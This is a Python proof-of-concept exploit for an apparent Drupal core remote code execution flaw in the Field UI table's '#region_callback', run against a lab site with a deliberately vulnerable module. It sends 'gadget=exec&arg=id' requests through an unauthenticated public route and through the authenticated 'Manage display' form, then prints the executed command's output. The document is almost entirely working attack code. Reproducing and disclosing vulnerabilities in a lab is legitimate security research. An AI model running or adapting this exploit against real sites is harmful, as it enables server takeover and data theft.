#!/usr/bin/env python3
"""
PoC — SA-CORE-2026-014 / CVE-2026-108097
Drupal core 11.4.9 — remote code execution through the Field UI table.

Vulnerable sink (core/modules/field_ui/src/Element/FieldUiTable.php:72):

    $region_name = call_user_func_array($row['#region_callback'], [&$row]);

'#region_callback' is a value taken from the RENDER ARRAY and is executed
without any validation: no is_callable() check, no allow-list, no signature
restriction. Core's own test module supplies one from hook_form_alter()
(core/modules/field_ui/tests/modules/field_ui_test/src/Hook/FieldUiTestHooks.php:46),
so this is a documented extension point rather than an internal detail.

The lab module vulnlab_field_ui plays the role of the contributed module from
the advisory: it copies REQUEST data into '#region_callback'. Core then runs
whatever callable ended up there.

Paths exercised:
  1. UNAUTHENTICATED - a public route renders a field_ui_table.
  2. AUTHENTICATED   - core's own "Manage display" form is the sink.

Usage:
    python3 f1_field_ui_rce.py [--url http://localhost:8080]
"""

from __future__ import annotations

import argparse
import re
import sys

from common import (
    ADMIN_PASS,
    ADMIN_USER,
    BASE_URL,
    Lab,
    head,
    info,
    ok,
    bad,
    require_site,
)


def extract_exec_output(html: str) -> str | None:
    """Pulls the command output the 'exec' gadget rendered into the table."""
    m = re.search(r'<span class="vulnlab-exec-output">(.*?)</span>', html, re.S)
    return m.group(1).strip() if m else None


def run_unauthenticated(lab: Lab) -> bool:
    head("Path 1 — UNAUTHENTICATED (public route)")
    url = "/vulnlab/field-ui-rce?gadget=exec&arg=id"
    status, _, html = lab.get(url)
    info(f"GET {url} -> {status}")

    if status != 200:
        bad(f"expected HTTP 200, got {status}")
        return False

    out = extract_exec_output(html)
    if out:
        ok("the request-chosen callable EXECUTED inside the Drupal web process")
        for line in out.splitlines():
            print(f"        {line}")
        return True

    bad("the gadget did not run (no output rendered)")
    return False


def run_authenticated(lab: Lab) -> bool:
    head("Path 2 — AUTHENTICATED (core's own 'Manage display' form)")
    if not lab.login(ADMIN_USER, ADMIN_PASS):
        bad("admin login failed")
        return False
    ok(f"logged in as {ADMIN_USER}")

    url = "/admin/structure/types/manage/vulnlab_article/display/default?vulnlab_gadget=exec&vulnlab_arg=id"
    status, _, html = lab.get(url)
    info(f"GET {url} -> {status}")

    if status != 200:
        bad(f"expected HTTP 200, got {status}")
        return False

    out = extract_exec_output(html)
    if out:
        ok("core's own display form executed the request-chosen callable")
        for line in out.splitlines():
            print(f"        {line}")
        return True

    bad("the gadget did not run on the display form")
    return False


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default=BASE_URL, help="base URL of the lab site")
    args = parser.parse_args()

    head("SA-CORE-2026-014 / CVE-2026-108097 — field_ui RCE")
    if not require_site(args.url):
        return 2

    lab = Lab(args.url)
    results = [
        run_unauthenticated(lab),
        run_authenticated(lab),
    ]

    print()
    if all(results):
        ok("F1 reproduced: attacker-chosen callable executed by Drupal core.")
        return 0
    bad("F1 NOT fully reproduced.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
